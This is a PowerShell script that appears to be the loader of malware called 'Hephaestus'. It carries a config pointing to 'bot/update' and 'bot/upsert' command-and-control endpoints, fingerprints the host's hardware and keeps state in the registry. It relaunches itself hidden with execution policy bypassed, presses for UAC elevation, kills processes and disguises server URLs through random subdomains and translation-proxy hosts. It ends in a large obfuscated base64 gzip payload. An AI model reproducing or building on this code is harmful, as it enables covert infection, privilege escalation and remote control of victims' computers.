
$server = @'
{
  "version": "2026.04.03 13:33:47",
  "urlDoc": "",
  "disabled": false,
  "disableVirus": false,
  "serverIp": "192.168.0.92",
  "server": "default",
  "htmlTemplateSponsorFile": "C:\\soft\\hephaestus\\php\\.\\download.html",
  "primaryDns": "192.168.0.92",
  "secondaryDns": "192.168.0.92",
  "extraUpdate": false,
  "updateUrl": "http://192.168.0.92/bot/update",
  "track": true,
  "trackDesktop": false,
  "trackUrl": "http://192.168.0.92/bot/upsert",
  "autoStart": true,
  "autoUpdate": true,
  "aggressiveAdmin": true,
  "aggressiveAdminDelay": 30,
  "aggressiveAdminAttempts": 0,
  "aggressiveAdminTimes": 0,
  "pushesForce": true,
  "pushes": [],
  "startDownloadsForce": true,
  "startDownloads": [],
  "startUrlsForce": false,
  "startUrls": [],
  "frontForce": false,
  "front": [],
  "embeddingsForce": false,
  "embeddings": [],
  "certToolExe": "C:\\soft\\hephaestus\\output\\certtool.exe"
}
'@ | ConvertFrom-Json


function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}



$xbody = "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